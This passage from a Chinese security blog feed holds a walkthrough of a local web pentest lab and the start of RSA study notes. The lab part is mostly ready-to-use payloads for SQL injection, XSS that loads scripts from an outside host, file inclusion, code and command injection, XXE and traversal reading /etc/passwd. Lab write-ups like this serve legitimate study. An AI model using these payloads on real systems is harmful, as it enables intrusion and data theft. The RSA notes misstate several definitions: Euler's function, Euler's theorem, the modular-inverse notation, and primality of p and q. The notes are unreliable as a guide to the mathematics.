<p>m (PCRE_MULTILINE)<br>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 (\$) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 D 修饰符)。这个行为和 perl 相同。当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 \$，设置这个修饰符不产生任何影响。</p>
</blockquote>
<p>意思就是，加了一个\n后，就会有两行，只要其中一行满足正则匹配就会返回true</p>
<h2 id="Example_8">Example 8</h2><p>很明显，是在<code>order by</code>的位置注，不过就不能使用union了，所以用布尔盲注。。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example8.php?order=id`,(select%<span class="number">20</span><span class="function">ascii</span>(<span class="function">substr</span>(<span class="function">user</span>(), [var1],<span class="number">1</span>))=[var2])%<span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
<p>写个脚本跑这个payload就好了，有两个变量var1和var2，var1是int型表示字符串的几var1位，var2就是跑ascii码，如果页面有显示内容，则表示user()第var1字符的ascii码为var2。</p>
<p>以前写过这样的脚本，现在就懒得写了。。</p>
<h2 id="Example_9">Example 9</h2><p>和前面一个比，就是少了一个`， 其他都一样<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example8.php?order=id, (select%<span class="number">20</span><span class="function">ascii</span>(<span class="function">substr</span>(<span class="function">user</span>(), [var1],<span class="number">1</span>))=[var2])%<span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
<h1 id="XSS">XSS</h1><h2 id="Example_1-1">Example 1</h2><p>很简单，没做过过滤的xss<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example1.php?name=hacker%<span class="number">3</span>Cscript%<span class="number">20</span>src=%<span class="number">22</span>http://xxx.xxx.xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
<p>成功弹窗</p>
<h2 id="Example_2-1">Example 2</h2><p>变个大小写就好了<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example2.php?name=hacker%<span class="number">3</span>Cscript%<span class="number">20</span>src=%<span class="number">22</span>http://xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/scriPT%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3-1">Example 3</h2><p>价格空格就好了<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example3.php?name=hacker%<span class="number">3</span>CscripT%<span class="number">20</span>src=%<span class="number">22</span>http://xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/<span class="type">Script</span>%<span class="number">20</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_4-1">Example 4</h2><p>过滤了script，而且不是去掉而是出现了就直接报错，不过任然可以日。<br>payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/xss/example4.php?name=hacker<span class="number">%3</span>Csvg/onload=<span class="number">%22</span>var<span class="number">%20</span>i=String.fromCharCode(115,<span class="number">%2099</span>,<span class="number">%20114</span>,<span class="number">%20105</span>,<span class="number">%20112</span>,<span class="number">%20116</span>);s<span class="number">%20</span>=<span class="number">%20</span>createElement(i);body.appendChild(s);s.src=<span class="number">%27</span>http://xxx/template/alert.js<span class="number">%27</span>;<span class="number">%22</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_5-1">Example 5</h2><p>过滤的是alert，可惜我都不是直接用alert, 改个文件名就好了<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/xss/example5.php?name=hacker<span class="number">%3</span>Cscript<span class="number">%20</span>src=<span class="number">%22</span>http://xxx/myjs/test.js<span class="number">%22</span><span class="number">%3</span>E<span class="number">%3</span>C/script<span class="number">%3</span>E</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_6-1">Example 6</h2><p>这回代码是插在<code>&lt;script&gt;</code>里面, 没做啥过滤<br>payload:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example6.php?name=<span class="string">script";s=document.createElement($a);s.src="</span>http://xxx/<span class="keyword">template</span>/alert.<span class="string">js";document.getElementsByTagName( "</span><span class="string">head" )[0].appendChild(s);//</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Exmple_7">Exmple 7</h2><p>…过滤了双引号。。不过和上题有差？<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example7.php?name=script';s=document.createElement($a);s.src='http://xxx/<span class="keyword">template</span>/alert.js';document.getElementsByTagName( 'head')[<span class="number">0</span>].appendChild(s);//</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_8-1">Example 8</h2><p>这题改成POST了，然后直接输出，把尖括号编码了。。能艹？上次SSCTF也有类似的题，可是是通过框架来日。。所以看了下源码。。<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;"</span> <span class="keyword">method</span>=<span class="string">"POST"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>好了，有了这句就能艹了。。原来不是用POST</p>
<p>payload:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/xss/example8.php/"&gt;<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xxx</span>/<span class="attribute">template</span>/<span class="attribute">alert.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_9-1">Example 9</h2><p>这题貌似看浏览器啊。。用firefox会自动帮你urlencode，用chrome成功了。。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/xss/example9.php#<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xss.lazysheep.cc</span>/<span class="attribute">template</span>/<span class="attribute">alert.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="File_Include">File Include</h1><h2 id="Example_1-2">Example 1</h2><p>很简单。。没做任何过滤<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:<span class="regexp">//</span><span class="number">192.168</span>.56.102<span class="regexp">/fileincl/example1.php?page=/</span>..<span class="regexp">/../</span>../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-2">Example 2</h2><p>也简单，就是会在名字后面自动加上<code>.php</code>，用%00可以bypass<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.102/fileincl</span><span class="regexp">/example2.php?page=/etc</span><span class="regexp">/passwd%00</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Code_injection">Code injection</h1><h2 id="Example_1-3">Example 1</h2><p>入门的代码执行漏洞。。没做任何过滤。。<br>payload:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span>/codeexec/example1.php?name=<span class="variable">%22</span>;<span class="keyword">system</span>(<span class="variable">%27cat</span><span class="variable">%20</span>/etc/passwd<span class="variable">%27</span>);<span class="regexp">//</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-3">Example 2</h2><p>这题也不难，搜索一下<code>php create_function 代码注入</code>，我来分析下。。源码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(<span class="variable">$users</span>, create_<span class="keyword">function</span>(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a-&gt;'</span>.<span class="variable">$order</span>.<span class="string">',$b-&gt;'</span>.<span class="variable">$order</span>.<span class="string">');'</span>));</span><br></pre></td></tr></table></figure></p>
<p>然后系统会拼凑一个函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">(<span class="variable">$a</span>, <span class="variable">$b</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strcmp(<span class="variable">$a</span>-&gt;<span class="variable">$order</span>, <span class="variable">$b</span>-&gt; <span class="variable">$order</span>); &#125;</span><br></pre></td></tr></table></figure></p>
<p>然后会使用eval函数，看到这里就好了。。<br>Payload：<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="value">://<span class="number">192.168</span>.<span class="number">56.102</span>/codeexec/example2.php?order=id,<span class="variable">$b</span>-%<span class="number">3</span>Ename);</span>&#125;<span class="function">phpinfo</span>();<span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<p>这样拼凑的函数就成了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strcmp(<span class="variable">$a</span>-&gt;id, <span class="variable">$b</span>-&gt;name);&#125;phpinfo();<span class="comment">//);&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3-2">Example 3</h2><p>这题随便试下报错发现用了preg_replace，然后又是代码注入的题，自然想到了<code>\e</code>修饰符<br>Payload:<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">56.101</span>/codeexec/example3.php?<span class="variable">new=</span>phpinfo()&amp;<span class="variable">pattern=</span>/lamer/e&amp;<span class="variable">base=</span>lamer</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_4-2">Example 4</h2><p><code>assert</code>的命令执行，跟<code>eval</code>用法类似，不过黑盒了半天都有问题。白盒了后<br>Payload:<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="value">://<span class="number">192.168</span>.<span class="number">56.101</span>/codeexec/example4.php?name=%<span class="number">27</span>.<span class="function">phpinfo</span>();</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Commands_injecttion">Commands injecttion</h1><h2 id="Example_1-4">Example 1</h2><p>没做任何过滤的。。。直接就可以输入命令了。。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.101</span>/commandexec/example1.php?ip=</span></span>;<span class="tag">ls</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-4">Example 2</h2><p>这种遇到的少了，还是白盒了，然后发现<code>preg_match</code>的正则有\m修饰符，就会了。。。<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168.56.101</span>/commandexec/example2.php?ip=<span class="number">127.0.0.1</span>%0als</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3-3">Example 3</h2><p>这题还不错。。受到前几题的影响，一直在想正则怎么绕了，研究了半天，发现正则写的没问题，根本绕过不<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match('/^<span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="formula">$/', $</span>_GET<span class="special">[</span>'ip'<span class="special">]</span>)</span><br></pre></td></tr></table></figure></p>
<p>看了LL的wp后在注意到，header后竟然没有exit，这就跟没过滤一样了，这类的题目以前遇到过。。<br>Payload:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v "http://<span class="number">192.168.56.101</span>/commandexec/example3.php?ip=<span class="number">127.0.0.1</span><span class="comment">;ls"</span></span><br></pre></td></tr></table></figure></p>
<h1 id="XML_attacks">XML attacks</h1><p>这部分是XXE注入，XML Entity Injection, XML不是特别了解，参考文档<a href="https://www.91ri.org/9539.html" target="_blank" rel="external">https://www.91ri.org/9539.html</a></p>
<h2 id="Example_1-5">Example 1</h2><p>根据文档中的例子，自己试了试，把能删的都删了，剩下必须的部分：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span>/xml/example1.php?xml=<span class="variable">%3C</span><span class="variable">%21DOCTYPE</span><span class="variable">%20h</span><span class="variable">%20</span><span class="variable">%5B</span><span class="variable">%3C</span><span class="variable">%21ENTITY</span><span class="variable">%20pen</span><span class="variable">%20SYSTEM</span><span class="variable">%20</span><span class="variable">%22file</span><span class="variable">%3A</span><span class="variable">%2f</span><span class="variable">%2f</span><span class="variable">%2fetc</span><span class="variable">%2fpasswd</span><span class="variable">%22</span><span class="variable">%20</span><span class="variable">%3E</span><span class="variable">%5D</span><span class="variable">%3E</span><span class="variable">%3Ctext</span><span class="variable">%3E</span><span class="variable">%26pen</span><span class="variable">%3B</span><span class="variable">%3C</span><span class="variable">%2ftext</span><span class="variable">%3E</span></span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM <span class="string">"file:///etc/passwd"</span> &gt;]&gt;&lt;text&gt;&amp;pen;&lt;<span class="regexp">/text&gt;</span><br><span class="line">http:/</span><span class="regexp">/192.168.56.101/xml</span><span class="regexp">/example1.php?xml=%3C%21DOCTYPE%20h%20%5B%3C%21ENTITY%20pen%20SYSTEM%20%22php%3A%2f%2ffilter%2fread%3Dconvert.base64-encode%2fresource%3Dexample1.php%22%20%3E%5D%3E%3Ctext%3E%26pen%3B%3C%2ftext%3E</span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM "php:/</span><span class="regexp">/filter/read</span>=convert.base64-encode/resource=example1.php<span class="string">" &gt;]&gt;&lt;text&gt;&amp;pen;&lt;/text&gt;</span><br><span class="line">http://192.168.56.101/xml/example1.php?xml=<span class="variable">%3C</span><span class="variable">%21DOCTYPE</span><span class="variable">%20h</span><span class="variable">%20</span><span class="variable">%5B</span><span class="variable">%3C</span><span class="variable">%21ENTITY</span><span class="variable">%20pen</span><span class="variable">%20SYSTEM</span><span class="variable">%20</span><span class="variable">%22http</span>:/<span class="variable">%2f127</span>.0.0.1<span class="variable">%22</span><span class="variable">%20</span><span class="variable">%3E</span><span class="variable">%5D</span><span class="variable">%3E</span><span class="variable">%3Ctext</span><span class="variable">%3E</span><span class="variable">%26pen</span><span class="variable">%3B</span><span class="variable">%3C</span><span class="variable">%2ftext</span><span class="variable">%3E</span></span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM "</span>http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="string">" &gt;]&gt;&lt;text&gt;&amp;pen;&lt;/text&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>SYSTEM之后的参数可以如下协议：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">file:</span><span class="comment">//</span></span><br><span class="line"><span class="string">http:</span><span class="comment">//</span></span><br><span class="line"><span class="string">php:</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-5">Example 2</h2><p>这个是XML Injection，以前做过，也写过wp，<a href="http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100" target="_blank" rel="external">http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100</a><br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.101/xml/example2.php?name=hacker<span class="number">%27</span><span class="number">%5</span>D<span class="number">%20</span><span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>f<span class="number">%2</span>f<span class="number">%2</span>a<span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>f<span class="number">%2</span>f<span class="number">%2</span>a<span class="number">%5</span>B<span class="number">%27</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Directory_traversal">Directory traversal</h1><h2 id="Example_1-6">Example 1</h2><p>打开来看啥也没有。。不明所以，看了下源码，是没做任何过滤的任意文件读取，，<br>Payload:<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:<span class="regexp">//</span><span class="number">192.168</span>.56.101<span class="regexp">/dirtrav/example1.php?file=../</span>..<span class="regexp">/../</span>../etc/passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-6">Example 2</h2><p>也不难。。。几乎也跟没过滤一样<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.101/dirtrav</span><span class="regexp">/example2.php?file=/var</span><span class="regexp">/www/files</span><span class="regexp">/../</span>../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3-4">Example 3</h2><p>这题的这正则有跟没有一样。。。不能匹配到结尾的<code>\x00</code><br>Payload:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.101/dirtrav</span><span class="regexp">/example3.php?file=../</span>../../etc/passwd%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
<h1 id="File_Upload">File Upload</h1><h2 id="Example_1-7">Example 1</h2><p>同样是没做过滤。。。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo "<span class="php"><span class="preprocessor">&lt;?php</span> phpinfo();<span class="preprocessor">?&gt;</span></span>" &gt; /tmp/test.php</span><br></pre></td></tr></table></figure></p>
<p>把 <code>/tmp/test.php</code> 上传上去，然后可以直接访问。。同样可以写一句话getshell</p>
<h2 id="Example_2-7">Example 2</h2><p>这题过滤了php结尾的文件。。。然后php3 bypass后可成功执行</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>玩了下exploit, 再来玩玩pentest。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Pentest" scheme="http://0x48.pw/tags/Pentest/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[0CTF RSA?总结 || RSA学习笔记]]></title>
    <link href="http://0x48.pw/2016/03/17/0x14/"/>
    <id>http://0x48.pw/2016/03/17/0x14/</id>
    <published>2016-03-17T01:18:02.000Z</published>
    <updated>2016-03-28T10:18:43.374Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>果然不是信息安全专业的，只是自学会有很多技能点的缺失。</p>
</blockquote>
<a id="more"></a>
<p>该题用的是中国剩余定理，顺便学了一遍RSA，发现了数学技能点的缺失</p>
<p>(PS: ^表示为次方，xor才是异或，％和mod为求余，/表示为整除)</p>
<h1 id="RSA学习笔记">RSA学习笔记</h1><p>先来学学前置技能</p>
<h2 id="前置技能">前置技能</h2><h3 id="学前符号助记">学前符号助记</h3><p>$ x = y\ (mod\ n) $         可以看成是        $ x \% n = y$<br>$ x \equiv y\ (mod\ n)$      可以看成是        $ x \% n = y \% n$</p>
<h3 id="欧拉函数">欧拉函数</h3><p>$$\phi(q) = \prod_{k=1}^∞ (1 - q^k)$$</p>
<p>然后在RSA中用到的性质： </p>
<blockquote>
<p>m是素数时，有 $\phi(m) = m - 1$</p>
<p>当m, n互质时，有 $\phi(m*n) = \phi(m) * \phi(n)$</p>
</blockquote>
<h3 id="欧拉定理">欧拉定理</h3><blockquote>
<p>设p和q互质，则 $q^{p-1} \equiv 1\ (mod\ p)$</p>
</blockquote>
<p>根据前面这说的该公式的意义为： $q^{p-1} \% p = 1 \% p$<br>所以最后可以得出：$q^{p-1} \% p = 1$</p>
<h3 id="模反元素">模反元素</h3><p>设x为q的模反元素，则x必须满足：</p>
<blockquote>
<p>$q * x \equiv 1\ (mod\ p) \Longrightarrow (q*x) \% p = 1$</p>
</blockquote>
<p>性质：</p>
<blockquote>
<p>x为q的模反元素，则$x + kp$ 都是q的模反元素(k为整数)</p>
</blockquote>
<h3 id="模逆元">模逆元</h3><p>也就是上面说的模反元素的公式：$q * x \equiv 1\ (mod\ p)$等同于$x^{-1} \equiv q\ (mod\ p)$</p>
<h3 id="中国剩余定理">中国剩余定理</h3><p>已知p, q互质<br>$n = p * q$<br>$\begin{cases}<br>c_1 \equiv x \% p\\<br>c_2 \equiv x \% q<br>\end{cases}$<br>求 $c \equiv x  \% n$</p>
<p>类似RSA?这题来举个例子：<br>已知存在三个互质数$n_1, n_2, n_3$<br>可以计算出<br>$$\begin{cases}<br>N = n_1 * n_2 * n_3\\<br>N_1 = N / n_1 = n_2 * n_3\\<br>N_2 = N / n_2 = n_1 * n_3\\<br>N_3 = N / n_3 = n_2 * n_1\\<br>d_1 = N^{-1}_1 (mod\ n_1)\\<br>d_2 = N^{-1}_2 (mod\ n_2)\\<br>d_3 = N^{-1}_3 (mod\ n_3)\\<br>\end{cases}$$</p>
<p>有存在一数x，已知<br>$$\begin{cases}<br>c_1 \equiv x \% n_1\\<br>c_2 \equiv x \% n_2\\<br>c_3 \equiv x \% n_3<br>\end{cases}$$</p>
<p>则我们可以求得：<br>$$<br>c \equiv x \% n   \Rightarrow   c \equiv (c_1N_1d_1 + c_2N_2d_2 + c_3N_3d_3) (mod\ N)<br>$$</p>
<h3 id="欧几里德算法">欧几里德算法</h3><p>公式：<br>$$gcd(a,b) = gcd(b, a\ mod\ b)$$<br>Python实现该算法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b, a%b)</span><br></pre></td></tr></table></figure></p>
<p>扩展算法：<br>扩展算法是已知a, b 求 $ax + by = gcd(a, b) = d$中的x, y<br>x和y是一个多解的集合，而扩展算法是计算其中的一个特解，而我们取的特解是在上面的欧几里德算法中最后一步：<br>$a = gcd(A, B)$<br>$b = 0$<br>这时候我们可以有特解$x = 1, y = 0$<br>$$gcd(a, b) * 1 + 0 * 0 = gcd(a, b)$$<br>那么怎么把这个算法扩展开来呢？最开始是<br>$$A_0x_0 + B_0y_0 = gcd(A, B)$$<br>在一次求余之后<br>$A_1 = B_0$<br>$B_1 = A_0 \% B_0$<br>这时候<br>$$A_1x_1 + B_1y_1 = gcd(A, B)$$<br>$$\Downarrow$$<br>$$B_0x_1 + (A_0 \% B_0)y_1 = gcd(A, B)$$<br>因为<br>$A \% B = A - (A / B) * B$<br>所以上面的式子可以转换成：<br>$$B_0x_1 + (A_0 - (A_0 / B_0)B_0)y_1 = gcd(A, B)$$<br>$$\Downarrow$$<br>$$A_0y_1 +  B_0(x_1 - (A_0 / B_0)y_1) = gcd(A, B)$$<br>和最开始的式子比较，可以得出：<br>$$<br>\begin{cases}<br>x_0 = y_1\\<br>y_0 = x_1 - (A_0 / B_0)y_1<br>\end{cases}<br>$$<br>通过上面的算法，可以写出下面的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_gcd2</span><span class="params">(a, b)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">		x = <span class="number">1</span></span><br><span class="line">		y = <span class="number">0</span></span><br><span class="line">		<span class="keyword">return</span> (a, x, y)</span><br><span class="line">	(ans, x, y) = e_gcd2(b, a % b)</span><br><span class="line">	x, y = y, x - a / b * y</span><br><span class="line">	<span class="keyword">return</span> (ans, x, y)</span><br></pre></td></tr></table></figure></p>
<p>由于数学知识的限制，只能用递归写出。下面是wp中别人用循环的方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_gcd</span><span class="params">(aa, bb)</span>:</span></span><br><span class="line">    lastremainder, remainder = abs(aa), abs(bb)</span><br><span class="line">    x, lastx, y, lasty = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> remainder:</span><br><span class="line">        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)</span><br><span class="line">        x, lastx = lastx - quotient * x, x</span><br><span class="line">        y, lasty = lasty - quotient * y, y</span><br><span class="line">    <span class="keyword">return</span> lastremainder, lastx * (-<span class="number">1</span> <span class="keyword">if</span> aa &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span>), lasty * (-<span class="number">1</span> <span class="keyword">if</span> bb &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span>）</span><br></pre></td></tr></table></figure></p>
<h3 id="Other">Other</h3><p>经常看到的两个定义：</p>
<blockquote>
<p>$lcm(x, y)$     x和y的最小公倍数<br>$gcd(e, l)$      e和l的最大公约数</p>
</blockquote>
<h2 id="RSA密钥生成">RSA密钥生成</h2><p>前置技能学完了，开始研究RSA了<br>在密钥中包含了两个数据：<br>公钥：(N, e)<br>私钥：(N, d)<br>下面来看看怎么求N, e, d这三个数</p>
<ul>
<li>搞出两个超大的互质数设为p和q<blockquote>
<p>p和q互质</p>
</blockquote>
</li>
<li>p和q相乘得出密钥长度N<blockquote>
<p>$N = p * q$</p>
</blockquote>
</li>
<li>计算N的欧拉函数<blockquote>
<p>$\phi(N) = \phi(p*q) = \phi(p) * \phi(q) = (p - 1) * (q - 1)$</p>
</blockquote>
</li>
